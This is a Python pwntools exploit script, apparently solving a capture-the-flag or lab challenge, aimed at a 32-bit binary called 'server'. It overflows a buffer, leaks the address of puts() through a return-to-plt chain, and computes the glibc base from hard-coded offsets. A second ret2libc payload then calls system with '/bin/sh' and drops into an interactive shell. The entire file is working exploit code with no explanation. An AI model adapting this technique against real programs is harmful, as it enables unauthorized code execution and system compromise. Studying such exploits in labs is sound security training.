#!/usr/bin/env python3

from pwn import *

context.binary = 'server'
elf = context.binary


def main():
    p = elf.process()

    main_addr     = 0x8048640
    puts_plt_addr = 0x8048410
    puts_got_addr = 0x804a018

    offset = 60
    junk = b'A' * offset

    payload  = junk
    payload += p32(puts_plt_addr)
    payload += p32(main_addr)
    payload += p32(puts_got_addr)

    p.sendlineafter(b'Input some text: ', payload)
    p.recvuntil(b'Return address')
    p.recvline()
    p.recvline()

    puts_addr = u32(p.recvline().strip()[:4])
    log.info(f'Leaked puts() address: {hex(puts_addr)}')

    puts_offset   = 0x071290
    system_offset = 0x045420
    bin_sh_offset = 0x18f352

    glibc_base_addr = puts_addr - puts_offset
    log.info(f'Glibc base address: {hex(glibc_base_addr)}')  

    system_addr = glibc_base_addr + system_offset
    bin_sh_addr = glibc_base_addr + bin_sh_offset

    payload  = junk
    payload += p32(system_addr)
    payload += p32(0)
    payload += p32(bin_sh_addr)

    p.sendlineafter(b'Input some text: ', payload)
    p.recv()

    p.interactive()


if __name__ == '__main__':
    main()
